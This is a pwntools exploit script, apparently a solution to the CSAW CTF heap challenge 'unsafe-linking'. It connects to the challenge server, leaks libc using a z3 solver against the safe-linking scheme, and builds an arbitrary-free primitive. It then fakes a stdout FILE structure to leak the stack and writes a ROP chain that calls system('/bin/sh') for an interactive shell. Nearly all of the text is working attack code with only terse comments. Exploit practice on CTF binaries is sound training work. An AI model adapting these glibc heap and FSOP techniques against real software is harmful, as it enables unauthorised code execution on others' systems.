#!/usr/bin/env python3
from pwn import *
from z3 import *

context.arch = 'amd64'
#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

elf = ELF('./unsafe-linking')

context.binary = elf

ENCODING = 'ISO-8859-1'
s = lambda senddata : p.send(senddata.encode(ENCODING))
sa = lambda recvdata, senddata : p.sendafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
sl = lambda senddata : p.sendline(senddata.encode(ENCODING))
sla = lambda recvdata, senddata : p.sendlineafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
r = lambda numb=0x3f3f3f3f, timeout=0x3f3f3f3f : p.recv(numb, timeout=timeout).decode(ENCODING)
ru = lambda recvdata, timeout=0x3f3f3f3f : p.recvuntil(recvdata.encode(ENCODING), timeout=timeout).decode(ENCODING)
uu32 = lambda data : u32(data.encode(ENCODING), signed='unsigned')
uu64 = lambda data : u64(data.encode(ENCODING), signed='unsigned')
iu32 = lambda data : u32(data.encode(ENCODING), signed='signed')
iu64 = lambda data : u64(data.encode(ENCODING), signed='signed')
up32 = lambda data : p32(data, signed='unsigned').decode(ENCODING)
up64 = lambda data : p64(data, signed='unsigned').decode(ENCODING)
ip32 = lambda data : p32(data, signed='signed').decode(ENCODING)
ip64 = lambda data : p64(data, signed='signed').decode(ENCODING)

local = 0
if local:
    p = process([elf.path])
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = remote('pwn.chal.csaw.io', 5003)
    libc = ELF('./libc.so.6')

def create(idx, sz, data):
    sla('> ', '1')
    sla('Do you want to tell me a secret?(0/1)\n', str(0))
    sla('Which page do you want to write the note down?\n', str(idx))
    sla('How many bytes will it be?\n', str(sz))
    sa('Content:\n', data)

def create_secret(idx, data):
    sla('> ', '1')
    sla('Do you want to tell me a secret?(0/1)\n', str(1))
    sla('Which page do you want to write the note down?\n', str(idx))
    sa('Content:\n', data)

def delete(idx):
    sla('> ', '2')
    sla('Which note do you want to delete?\n', str(idx))

def show(idx):
    sla('> ', '3')
    sla('Which note do you want to read?\n', str(idx))
    ru('Secret 0x')
    leaked = int(ru('(')[:-1], 16)
    ru('off= ')
    off = int(ru(')')[:-1], 16)
    return leaked, off

def decrypt(cipher):
    key = 0
    plain = 0
    for i in range(1, 6):
        bits = 64 - 12 * i
        if bits < 0:
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits
        key = plain >> 12
    return plain

def solve(xor_leak, sub_leak):
    xor_leak = BitVecVal(xor_leak, 64)
    sub_leak = BitVecVal(sub_leak, 64)
    rand_val = BitVec('rand_val', 64)
    ptr = BitVec('ptr', 64)
    s = Solver()
    s.add(xor_leak == (rand_val >> 0x1c) ^ ptr)
    s.add(sub_leak == (rand_val >> 0x1c) - (ptr >> 0xc))
    s.add((ptr >> 0x28) <= 0x7f)
    s.add((ptr >> 0x28) >= 0x0)
    if str(s.check()) == 'sat':
        m = s.model()
        return m.evaluate(ptr).as_long() & 0xfffffffff000
    else:
        print(s.check())
        exit(1)

# leak libc address
create(0, 0x8, '0' * 0x8)
create(1, 0x8, '1' * 0x8)
create(2, 0x8, '2' * 0x8)
create(3, 0x500, '3' * 0x8 + '\n') # put into unsorted bin
create(4, 0x8, '4' * 0x8)
for i in range(5): # fill up tcache
    delete(i)
for i in range(3):
    create_secret(i, '\n')
create(3, 0x500, '\n')
delete(3)
create_secret(4, '\n') # libc address in chunk 4
leaked, off = show(4)
info('leaked = ' + hex(leaked))
info('off = ' + hex(off))
libc_addr = solve(leaked, off)
info('libc_addr = ' + hex(libc_addr))
libc_base = libc_addr - 0x219000
info('libc_base = ' + hex(libc_base))

# create arbitrary free primitive
def arb_free(addr):
    create(0, 0x60, '\n')
    create(1, 0x60, '\n')
    delete(0)
    delete(1)
    create(3, 0x10, up64(addr) + '\n') # consolidated with chunk 0
    delete(0) # free address

# free fake chunks for arbitrary write
payload = (
    up64(0xdeadbeef) + up64(0x221) + # overlapping chunk (0x220)
    up64(0xdeadbeef) * 3 + (up64(0x41) + up64(0xdeadbeef) * 7) * 8 + # tcache chunks * 8 (0x40)
    '/bin/sh\x00'
)
create(4, 0x20000, payload + '\n')
payload_base = libc_base - 0x23ff0 # all fake chunks are on the same page
info('payload_base = ' + hex(payload_base))

# write stdout => FSOP to leak stack
arb_free(payload_base + 0x10) # free overlapping chunk (0x220)
arb_free(payload_base + 0x10 + 0x20 + 0x40 * 1) # free chunk 2 (0x40)
arb_free(payload_base + 0x10 + 0x20 + 0x40 * 0) # free chunk 1 (0x40)

def protect(pos, ptr):
    return (pos >> 12) ^ ptr

stdout_addr = libc_base + 0x21a780
info('stdout_addr = ' + hex(stdout_addr))
environ_addr = libc_base + 0x221200
info('environ_addr = ' + hex(environ_addr))
target_addr = environ_addr & ~0xff
info('target_addr = ' + hex(target_addr))
# https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/bits/types/struct_FILE.h#L49
fake_file = (
    up64(0xfbad2887) + # _flags
    up64(target_addr) + # _IO_read_ptr
    up64(target_addr) + # _IO_read_end
    up64(target_addr) + # _IO_read_base
    up64(target_addr) + # _IO_write_base
    up64(target_addr + 8) + # _IO_write_ptr
    up64(target_addr) # _IO_write_end
)
create(10, 0x210, up64(0xdeadbeef) * 3 + up64(0x41) + up64(protect(payload_base, stdout_addr)) + '\n') # write overlapping chunk
create(0, 0x30, '\n') # get chunk 1
create(1, 0x38, fake_file) # get target ptr
stack_addr = uu64(r(8))
info('stack_addr = ' + hex(stack_addr))

system_addr = libc_base + libc.sym['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))
info('system_addr = ' + hex(system_addr))
info('binsh_addr = ' + hex(binsh_addr))
pop_rdi_ret = libc_base + next(libc.search(asm('pop rdi ; ret')))
info('pop_rdi_ret = ' + hex(pop_rdi_ret))
ret = libc_base + 0x0000000000029cd6
info('ret = ' + hex(ret))
rop = up64(ret) * 2 + up64(pop_rdi_ret) + up64(binsh_addr) + up64(system_addr)

# write stack => ROP to get shell
delete(10) # free overlapping chunk (0x220)
arb_free(payload_base + 0x10 + 0x20 + 0x40 * 3) # free chunk 4 (0x40)
arb_free(payload_base + 0x10 + 0x20 + 0x40 * 2) # free chunk 3 (0x40)
stack_target = stack_addr - 0x168
create(10, 0x210, up64(0xdeadbeef) * 3 + 'A' * 0x80 + up64(0x41) + up64(protect(payload_base, stack_target)) + '\n') # write overlapping chunk
create(0, 0x30, '\n') # get chunk 3

#gdb.attach(p, 'pie breakpoint 0x00000000000016B0\npie breakpoint 0x0000000000001716\nc')

#input('@')
create(1, 0x30, rop + '\n') # write rop

p.interactive()

